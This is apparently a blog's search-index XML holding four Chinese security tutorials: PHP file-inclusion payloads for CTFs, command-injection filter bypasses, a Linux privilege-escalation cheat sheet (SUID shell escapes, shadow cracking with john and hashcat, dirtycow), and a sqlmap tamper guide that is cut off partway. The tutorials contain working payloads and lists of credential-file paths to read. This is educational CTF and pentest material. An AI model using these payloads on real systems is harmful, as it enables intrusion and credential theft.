<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF中的文件包含</title>
    <url>//posts/CTF%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CTF比赛中文件包含总是作为第一步或者最后一步来进行信息泄露或者flag读取，大多数的文件包含与文件读取有关，剩下的可能就是通过文件包含来getshell。</p>
<p>这篇文章主要是记录一下我打CTF比赛中的一些文件包含漏洞利用经验（由于比赛大部分是PHP的文件包含，所以这里是以PHP的文件包含为案例来写的，其他语言的文件包含类似）。</p>
<p>CTF中的文件包含，看这一篇就够了！</p>
<span id="more"></span>

<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>1、文件包含分为 ：本地包含和远程包含 远程包含需要php.ini中的allow_url_include &#x3D; On<br>2、inclue() include_once()和require（）require_once区别 ： 前者遇到错误给出警告继续执行，后者直接给出警告，终端执行！<br>3、一张表了解php的伪协议：</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>测试php版本</th>
<th>allow_url_fopen</th>
<th>allow_url_include</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>file:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;filter</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;input</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>on</td>
<td>?file&#x3D;php:&#x2F;&#x2F;input POST DATA <?php phpinfo(); ?></td>
</tr>
<tr>
<td>zip:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;zip:&#x2F;&#x2F;&#x2F;tmp&#x2F;1.zip%231.txt</td>
</tr>
<tr>
<td>compress.bzip2:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;file.bz2</td>
</tr>
<tr>
<td>compress.zlib:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;compress.zlib:&#x2F;&#x2F;.&#x2F;file.gz</td>
</tr>
<tr>
<td>data:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>on</td>
<td>on</td>
<td>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo(); ?> or ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; or ?file&#x3D;data:text&#x2F;plain,<?php phpinfo();?> or ?file&#x3D;data.text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>off&#x2F;on</td>
<td>off&#x2F;on</td>
<td>?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;php.jpg</td>
</tr>
</tbody></table>
<p>4、除了基础知识，我们还需要了解一些特性：</p>
<ul>
<li><p>%00截断 只适用于低版本php  php &lt;&#x3D; 5.3.0 且magic_quotes_gpc 为off</p>
</li>
<li><p>点号 系统特性截断 只适用于低版本php  php &lt;&#x3D; 5.3.0<br>windows 259个bytes <strong>.</strong> 可造成截断</p>
<p>linux 4096个bytes <strong>.</strong>  可造成截断</p>
</li>
<li><p>路径长度截断：<br>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.[…]&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.<br>(php版本小于5.3.0(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
</li>
<li><p>默认情况下 allow_url_fopen 为on allow_url_include 为off</p>
</li>
</ul>
<h3 id="各个协议详解"><a href="#各个协议详解" class="headerlink" title="各个协议详解"></a>各个协议详解</h3><p><strong>file协议</strong><br>可在allow_url_fopen ：off&#x2F;on allow_url_include：off&#x2F;on下均可使用，但是必须要用绝对路径，而且可以读取文件，当然文件内容不能是php代码形式（这点要切记，非常容易犯错）否则会被直接解析。如果不是php代码的内容会被直接显示出来。</p>
<p><strong>php:&#x2F;&#x2F;协议</strong><br>条件：<br>不需要开启allow_url_fopen，仅php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include。<br>1、php:&#x2F;&#x2F;filter 不需要 allow_url 开启即可读取、包含。PHP代码读取需要编码否则直接执行php代码（很重要）<br>2、常用来读取代码的包含命令  php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;cmd.php<br>3、php:&#x2F;&#x2F;input 需要 allow_url_include:on<br>4、当allow_url_include为On，而allow_url_fopen为Off的时候，不可以直接远程包含文件，但是可以使用php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp等伪协议<br>5、利用 php 的数据协议 data:&#x2F;&#x2F; 可以查看文件源代码，前提是 php.ini 中的 allow_url_fopen 和 allow_url_include 两个配置为 on</p>
<p><strong>zip协议</strong><br>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议在allow_url双off的情况下都可以正常使用；</p>
<p>zip协议：php5.2.x需要绝对路径 其他版本可以相对路径 windows复现成功了<br>包含例子：zip:&#x2F;&#x2F;1.png%231.php 或者 zip:&#x2F;&#x2F;1.zip%231.php</p>
<p><strong>phar协议</strong><br>allow 两个都为ON 并且PHP版本高于5.3<br>例子：<a href="http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg">http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg</a> 和zip伪协议是一样的用法<br>生成phar打包代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">PharData</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/phartest2.zip&#x27;</span>, <span class="number">0</span>,<span class="string">&#x27;phartest2&#x27;</span>,<span class="title class_">Phar</span>::<span class="variable constant_">ZIP</span>) ;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./php.php&#x27;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;a.jpg&#x27;</span>,<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">//会生成一个zip的压缩文件phartest2.zip 其中压缩了一个a.jpg a.jpg里面代码是php.php的内容</span></span><br><span class="line"><span class="comment">//当然和zip协议一样，你也可以把phartest2.zip改成任意后缀，这里的后缀和包含读取是没有关系的。怎么绕过白名单方便就怎么来</span></span><br><span class="line"><span class="comment">//然后我们构造http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg</span></span><br><span class="line"><span class="comment">//也可以直接shell</span></span><br><span class="line"><span class="comment">//其中phar适用范围为php&gt;5.3.0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>data:协议</strong><br>allow_url 两个都需要 On (没用，都为on我直接就去php:&#x2F;&#x2F;input getshell了)<br>例子：data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg （phpinfo)</p>
<h3 id="奇巧淫技"><a href="#奇巧淫技" class="headerlink" title="奇巧淫技"></a>奇巧淫技</h3><p>伪协议不只应用在文件包含中，所有对文件的操作都可以进行伪协议的利用，所以如果我们能控制文件名，就应该多跟一下这个文件名被哪些函数操作，而不是只关注在文件包含，下面这些函数都支持伪协议：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>()</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">copy</span>()</span><br><span class="line"><span class="title function_ invoke__">parse_ini_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>()</span><br><span class="line"><span class="title function_ invoke__">tempnam</span>()</span><br><span class="line"><span class="title function_ invoke__">touch</span>()</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>()</span><br><span class="line"><span class="title function_ invoke__">rename</span>()</span><br><span class="line"><span class="title function_ invoke__">unlink</span>()</span><br><span class="line"><span class="title function_ invoke__">rmdir</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>另外实际渗透测试中，我们无法进行可控的文件包含，只能盲包（😂就是盲目包含），所以下面是一些常见可供包含的文件路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">日志路径</span><br><span class="line">/var/log/apache/error.log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/log/asscess_log</span><br><span class="line">/var/log/access.log</span><br><span class="line">session 路径</span><br><span class="line">/tmp/sess_phpsession_id</span><br><span class="line"></span><br><span class="line">敏感信息路径</span><br><span class="line">windows</span><br><span class="line">c:\boot.ini  <span class="comment">#查看系统版本</span></span><br><span class="line">c:\Windows\System32\inetsrv\MetaBase.xml <span class="comment">#IIS配置文件</span></span><br><span class="line">c:\Windows\repair\sam  <span class="comment">#存储系统初次安装密码</span></span><br><span class="line">c:\Windows\php.ini  <span class="comment">#php配置信息</span></span><br><span class="line">c:\Windows\my.ini  <span class="comment">#mysql配置信息</span></span><br><span class="line">c:\Program Files\mysql\my.ini</span><br><span class="line">c:\Program Files\mysql\data\mysql\user.MYD <span class="comment">#mysql root</span></span><br><span class="line">phpstudy的各种路径具体分析</span><br><span class="line"></span><br><span class="line">linux</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.keystore</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/root/httpd/conf/httpd.conf</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]*</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/config.gz</span><br><span class="line">/etc/nginx/                <span class="comment">#配置文件具体路径自己找</span></span><br><span class="line">/etc/apache/               <span class="comment">#配置文件具体路径自己找</span></span><br></pre></td></tr></table></figure>

<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>php文件包含是最骚的，因为php太灵活（毕竟是世界上最好的语言），其他文件包含可关注下jsp的文件包含，但是感觉其他语言的文件包含漏洞较少。比如jsp也分为本地文件和远程文件包含，远程文件包含很少开启，另外jsp文件包含必须是1.jsp这种格式的而不是php那种可以任意后缀进行文件包含，所以在这点上jsp比php安全很多。当然，安全没有绝对。</p>
<p>如果上述内容有问题欢迎留言或者直接把疑问发我邮箱。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行专题</title>
    <url>//posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<p>前段时间给一些的学生讲解命令执行的trick，所以今天就总结了所讲的知识点，分享出来给大家学习。这里只是把网上的资源整合在了一起，加一些自己在ctf比赛中的trick，本文章适合打CTF的初学者。</p>
<span id="more"></span>  

<p>话不多说，直接看题目：  </p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>其实很多CTF已经考过这个考点了也有大佬发过文章，这里简单说一下：<br>我们利用 &gt;a 这种方式可以创建一个文件，然后我们可以创建一些类似 &gt;cat &gt;curl这样的文件。然后通过* 执行 或者 ls&gt;a这样把文件名写入到一个文件中通过sh a 来执行。<br>另外我们可以使用 \ 这种续行符号来拼接命令使得我们可以在有长度限制的命令执行中执行我们想执行的命令<br>一图胜千言：<br><img data-src="/images/pages/1565322181162.png" alt="1565322181162"><br>这里需要注意两点<br>1：文件名的顺序（这里就需要经验和尝试了 另外还有一个逆序rev和一些head等取位置的技巧）<br>2：命令拼接后保证命令的顺利执行</p>
<p>代码如下<br><img data-src="/images/pages/1565322190196.png" alt="1565322190196"><br>四个长度读取flag，其实很简单，四个长度都能getshell了<br>首先我们创建一个cat : &gt;cat 刚好四个字节<br>然后：*&gt;a 把cat 命令执行完毕后的结果写入a<br>最后：我们访问a文件可得到flag<br><img data-src="/images/pages/1565322199312.png" alt="1565322199312"><br>另外利用curl通过 &#x2F;&#x2F;命令拼接的形式可以直接getshell或者下载读取flag文件<br>更详细的操作参考：<a href="http://www.freebuf.com/articles/web/154453.html%EF%BC%88%E6%96%87%E7%AB%A0%E5%86%99%E7%9A%84%E8%BF%98%E6%98%AF%E5%BE%88%E5%A5%BD%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E5%BF%85%E9%A1%BB%E9%9C%80%E8%A6%81%E7%9B%AE%E5%BD%95%E6%9C%89%E5%8F%AF%E5%86%99%E6%9D%83%E9%99%90%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%98%E6%98%AF%E6%AF%94%E8%BE%83%E9%B8%A1%E8%82%8B%E7%9A%84%EF%BC%8C%E5%8F%AA%E8%83%BD%E8%AF%B4%E6%98%AFCTF%E7%9A%84%E4%B8%80%E4%B8%AAtrick%E5%90%A7%EF%BC%89">http://www.freebuf.com/articles/web/154453.html（文章写的还是很好的，但是这个必须需要目录有可写权限，所以还是比较鸡肋的，只能说是CTF的一个trick吧）</a></p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level-2"></a>Level-2</h2><p>源码如下：<br><img data-src="/images/pages/1565322300227.png" alt="1565322300227"><br>可以看到过滤了很多字节，但是linux可以利用变量拼接命令，比如：<br><img data-src="/images/pages/1565322306869.png" alt="1565322306869"><br>这是第一个技巧</p>
<p>第二个就是在linux中 ${IFS} 可以替代空格 还有一个是ca$(随便输入字符)t可以绕开cat 过滤<br><img data-src="/images/pages/1565322313852.png" alt="1565322313852"><br>所以payload的有两种：1、变量拼接绕过过滤<br>​                                     2、$(随便输入字符) 绕过过滤 </p>
<p>具体payload就不给出了,这个很简单！还有就是这种过滤是可以被反弹shell的，因为暂时还有一个我出的题目用到了这个getshell，所以暂时先不放了，等过几天在补充！</p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level-3"></a>Level-3</h2><p>这个是以前的一道CTF题，题目是让选手绕过正则，读取flag文件，其实这里主要就是两个地方需要注意：</p>
<p>1、在shell环境中多个命令的分隔符除了 ; 之外还有换行符 </p>
<p>2、正则表达式结尾的&#x2F;m ，在php中，&#x2F;m表示开启多行匹配模式，开启多行匹配模式之后^和$的含义就发生了变化，没开启多行模式之前(即单行匹配模式), ^ 和$ 是匹配字符串的开始和结尾，开启多行模式之后，多行模式^,$可以匹配行的开头和尾行结尾</p>
<p>先看源码:<br><img data-src="/images/pages/1565322457133.png" alt="1565322457133"><br>cat 一个用户输入的文件 后缀必须是txt的。</p>
<p>那么我们可以通过随意输入一个 .txt文件用%0a换行然后执行我们想要执行的命令</p>
<p>Payload：path&#x3D;ls.txt%0als%20|%20head%20-n2 （查看文件名）<br>Payload：path&#x3D;flag.txt%0Acat%<a href="mailto:&#50;&#48;&#x66;&#49;&#64;&#x67;&#x2e;&#112;&#x68;&#x70;">&#50;&#48;&#x66;&#49;&#64;&#x67;&#x2e;&#112;&#x68;&#x70;</a>%0A.txt （读取flag值）</p>
<p>东西都很简单，docker文件放在github上了大家没事可以玩儿一下</p>
<p>链接：<a href="https://github.com/geeeez/ctf-shelli">https://github.com/geeeez/ctf-shelli</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>command excution</tag>
      </tags>
  </entry>
  <entry>
    <title>linux提权之新手指南</title>
    <url>//posts/linux%E6%8F%90%E6%9D%83%E4%B9%8B%E6%96%B0%E6%89%8B%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>这篇文章主要是给自己做个笔记，方便提权时查找漏掉一些东西，然后本人也是开始学习提权的思路和过程，并没有太多的骚姿势分享给大家，所以本文适合小白吧。</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="comment">#查看当前用户权限</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span> -a </span><br><span class="line"><span class="comment">#Linux - 内核名</span></span><br><span class="line"><span class="comment">#audit - 主机名</span></span><br><span class="line"><span class="comment">#2.6.18-128.el5 - 内核版本</span></span><br><span class="line"><span class="comment">#1 SMP Wed Jan 21 10:41:14 ....2009 - 内核编译日期</span></span><br><span class="line"><span class="comment">#x86_64 - 操作系统版本</span></span><br><span class="line"><span class="comment">#x86_64 - 处理器类型</span></span><br><span class="line"><span class="comment">#x86_64 - 硬件平台</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#举个例子：</span></span><br><span class="line">4.4.0-161-generic  </span><br><span class="line"><span class="comment">#主版本.次版本.释出版本-修改版本</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line"><span class="comment">#同 uname -a的作用</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h4 id="searchsploit的使用"><a href="#searchsploit的使用" class="headerlink" title="searchsploit的使用"></a>searchsploit的使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例子如下，自己去学参数语法，不过一般下面这几句就够了</span></span><br><span class="line">searchsploit linux priv esc 4.4 ubuntu 16  <span class="comment">#priv esc 是为了匹配Privilege Escalation 即提权 </span></span><br><span class="line">//4.4.0 ubuntu 14</span><br><span class="line"><span class="comment">#使用--exclude=选项删除不想要的结果</span></span><br><span class="line">searchsploit smb windows remote --exclude=<span class="string">&quot;(POC)|txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索包含abcd的漏洞标题，默认不加参数即 -t 参数 空格隔开就犹如百度搜索的空格隔开</span></span><br><span class="line">searchsploit -t abcd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>一般服务器不会安装乱七八糟的其他应用，所以一般不会有suid提权，但是也不可掉以轻心。因为提权就是要搜集信息，想尽一切办法。<br>常见可用于suid提权的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap</span><br><span class="line"></span><br><span class="line">Vim</span><br><span class="line"></span><br><span class="line">find</span><br><span class="line"></span><br><span class="line">Bash</span><br><span class="line"></span><br><span class="line">More</span><br><span class="line"></span><br><span class="line">Less</span><br><span class="line"></span><br><span class="line">Nano</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span></span><br></pre></td></tr></table></figure>
<p>下面一一介绍各个工具的执行系统命令的例子。</p>
<p>查找符合条件的文件命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查找root权限的suid可执行文件</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p><strong>提权示例</strong><br><strong>nmap</strong><br>老版的nmap(2.02-5.21)有相互的功能–interactive</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p><strong>msf中也有相关的模块</strong><br>exploit&#x2F;unix&#x2F;local&#x2F;setuid_nmap<br>find<br>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line">vim</span><br></pre></td></tr></table></figure>
<p><strong>vim</strong><br>如果vim以SUID运行，就会继承root用户的权限，可以读取系统中所有的文件</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span>/<span class="keyword">vi</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<p><strong>bash</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -p</span><br><span class="line">&gt;<span class="comment"># id</span></span><br></pre></td></tr></table></figure>
<p><strong>less&#x2F;more</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure>

<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>有时候密码简单的时候也可以进行暴力破解，但是局限性也是有的 root才能读取shadow，但是有时候网站配置不当我们可以读取或者网站的一些敏感的信息泄露。</p>
<p>暴力破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># john 利用默认字典爆破，这里的shadow放置hash即可也可写入完整/etc/shadow内容</span></span><br><span class="line">john --wordlist=/usr/share/john/password.lst ./shadow</span><br><span class="line"><span class="comment">#执行完毕后查看破解出的明文密码</span></span><br><span class="line">john --show ./shadow</span><br><span class="line"></span><br><span class="line"><span class="comment">#hashcat 这里的shadow放置完善的hash即可</span></span><br><span class="line">hashcat -m 1800 -o found1.txt --remove shadow /usr/share/john/password.lst </span><br><span class="line"><span class="comment">#此处需要把linux 密码的hash提取出来放到一个文档重 然后查看输出 found1.txt即可</span></span><br></pre></td></tr></table></figure>

<h4 id="mimipenguin"><a href="#mimipenguin" class="headerlink" title="mimipenguin"></a>mimipenguin</h4><p>和mimikatz 一样 从内存读取密码，但是也是需要很高的权限，很少用。</p>
<h4 id="计划任务-cron"><a href="#计划任务-cron" class="headerlink" title="计划任务 - cron"></a>计划任务 - cron</h4><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是&#x2F;etc&#x2F;内系统的计划任务可以被列出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /etc/cron*</span><br></pre></td></tr></table></figure>
<p>默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连rootshell了，当然几率也比较小。</p>
<h4 id="exp编译"><a href="#exp编译" class="headerlink" title="exp编译"></a>exp编译</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#一般的exp编译</span></span><br><span class="line">gcc test.c -o <span class="built_in">test</span></span><br><span class="line"><span class="comment">#dirtycow exp 编译</span></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>


<h4 id="常用的exp"><a href="#常用的exp" class="headerlink" title="常用的exp"></a>常用的exp</h4><p><strong>dirty-cow</strong><br>漏洞范围：<br>Linux kernel &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复，所以如果看到内核编译日期是2017年以后的一般不考虑脏牛提权）<br>EXP地址：<br>1、<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a>  # 推荐用这个<br>2、<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、gcc -pthread <span class="keyword">dirty.c </span>-o <span class="keyword">dirty </span>-lcrypt <span class="comment">#1的exp -lcrypt 是调用crypt库进行编译就要加 -lcrypt -pthread同理</span></span><br><span class="line"><span class="number">2</span>、make  <span class="comment">#2的exp直接make</span></span><br></pre></td></tr></table></figure>
<p><strong>注意:</strong> dirtycow是通过修改root的用户名密码进行提权的，所以一定要记住备份原来的&#x2F;etc&#x2F;passwd，方便及时恢复。</p>
<p><strong>CVE-2010-3904</strong><br>漏洞范围:<br>Linux Kernel &lt;&#x3D; 2.6.36-rc8 RDS privilege escalation exploit<br>CVE-2010-3904</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gcc</span> <span class="number">15285</span>.c -o <span class="number">15285</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>一篇文章搞懂sqlmap的tamper</title>
    <url>//posts/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82sqlmap%E7%9A%84tamper/</url>
    <content><![CDATA[<h2 id="sqlmap的tamper-怎么使用？"><a href="#sqlmap的tamper-怎么使用？" class="headerlink" title="sqlmap的tamper 怎么使用？"></a>sqlmap的tamper 怎么使用？</h2><p>sqlmap -u [url] –tamper [模块名]</p>
<h2 id="sqlmap的tamper怎么编写？"><a href="#sqlmap的tamper怎么编写？" class="headerlink" title="sqlmap的tamper怎么编写？"></a>sqlmap的tamper怎么编写？</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="comment">#See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="comment">#Author:J8sec.com</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">     <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">      <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>上面是一个tamper的完整结构结构，下面一一讲解其中的参数作用。</p>
<span id="more"></span>
<p><strong>PROIORITY</strong>是定义tamper的优先级，如果你加载多个tamper，这个选项就有用了，谁的优先级高，谁被优先使用。</p>
<ul>
<li>LOWEST &#x3D; -100</li>
<li>LOWER &#x3D; -50</li>
<li>LOW &#x3D; -10</li>
<li>NORMAL &#x3D; 0</li>
<li>HIGH &#x3D; 10</li>
<li>HIGHER &#x3D; 50</li>
<li>HIGHEST &#x3D; 100</li>
</ul>
<p><strong>dependencie</strong>，这个参数主要是起到提示作用，你可以写，也可以不写，但是如果你写的话，最好按照他的文档来写，它的标准示例是这样的：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">def dependencies<span class="literal">()</span>:</span><br><span class="line">    single<span class="constructor">TimeWarnMessage(<span class="string">&quot;此tamper &#x27;%s&#x27; 只针对 %s&quot;</span> % (<span class="params">os</span>.<span class="params">path</span>.<span class="params">basename</span>(<span class="params">__file__</span>)</span>.split(<span class="string">&quot;.&quot;</span>)<span class="literal">[<span class="number">0</span>]</span>, DBMS.MYSQL))</span><br></pre></td></tr></table></figure>
<p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数如下:</p>
<ul>
<li>ACCESS &#x3D; “Microsoft Access”</li>
<li>DB2 &#x3D; “IBM DB2”</li>
<li>FIREBIRD &#x3D; “Firebird”</li>
<li>MAXDB &#x3D; “SAP MaxDB”</li>
<li>MSSQL &#x3D; “Microsoft SQL Server”</li>
<li>MYSQL &#x3D; “MySQL”</li>
<li>ORACLE &#x3D; “Oracle”</li>
<li>PGSQL &#x3D; “PostgreSQL”</li>
<li>SQLITE &#x3D; “SQLite”</li>
<li>SYBASE &#x3D; “Sybase”</li>
<li>HSQLDB &#x3D; “HSQLDB”<br>下面就是最最重要的</li>
</ul>
